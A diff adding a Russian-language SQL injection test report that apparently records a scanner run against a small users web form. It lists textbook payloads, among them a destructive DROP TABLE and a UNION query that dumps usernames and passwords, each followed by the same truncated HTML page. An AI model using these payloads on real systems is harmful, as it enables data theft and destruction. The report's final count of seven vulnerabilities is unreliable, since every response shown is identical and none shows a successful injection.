@@ -1,0 +1,126 @@
+Отчет о тестировании SQL инъекций
+========================================
+Дата проверки: 2024-12-10 20:56:56
+Всего тестов: 7
+
+Полезная нагрузка: ' OR '1'='1
+Ответ сервера: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users List</title>
+</head>
+<body>
+    <h1>Добавить пользвотеля в базу</h1>
+    <form action="/add" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" required><br>
+        <label for="email">Email:</label>
+        <input type="email" name="email" id="email" required><br>
+      
+
+Полезная нагрузка: '; DROP TABLE user; --
+Ответ сервера: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users List</title>
+</head>
+<body>
+    <h1>Добавить пользвотеля в базу</h1>
+    <form action="/add" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" required><br>
+        <label for="email">Email:</label>
+        <input type="email" name="email" id="email" required><br>
+      
+
+Полезная нагрузка: '; SELECT * FROM user; --
+Ответ сервера: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users List</title>
+</head>
+<body>
+    <h1>Добавить пользвотеля в базу</h1>
+    <form action="/add" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" required><br>
+        <label for="email">Email:</label>
+        <input type="email" name="email" id="email" required><br>
+      
+
+Полезная нагрузка: ' UNION SELECT null, username, password FROM user --
+Ответ сервера: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users List</title>
+</head>
+<body>
+    <h1>Добавить пользвотеля в базу</h1>
+    <form action="/add" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" required><br>
+        <label for="email">Email:</label>
+        <input type="email" name="email" id="email" required><br>
+      
+
+Полезная нагрузка: ' OR '1'='1
+Ответ сервера: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users List</title>
+</head>
+<body>
+    <h1>Добавить пользвотеля в базу</h1>
+    <form action="/add" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" required><br>
+        <label for="email">Email:</label>
+        <input type="email" name="email" id="email" required><br>
+      
+
+Полезная нагрузка: '; DROP TABLE user; --
+Ответ сервера: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users List</title>
+</head>
+<body>
+    <h1>Добавить пользвотеля в базу</h1>
+    <form action="/add" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" required><br>
+        <label for="email">Email:</label>
+        <input type="email" name="email" id="email" required><br>
+      
+
+Полезная нагрузка: '; SELECT * FROM user; --
+Ответ сервера: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users List</title>
+</head>
+<body>
+    <h1>Добавить пользвотеля в базу</h1>
+    <form action="/add" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" required><br>
+        <label for="email">Email:</label>
+        <input type="email" name="email" id="email" required><br>
+      
+
+Всего уязвимостей: 7
+========================================
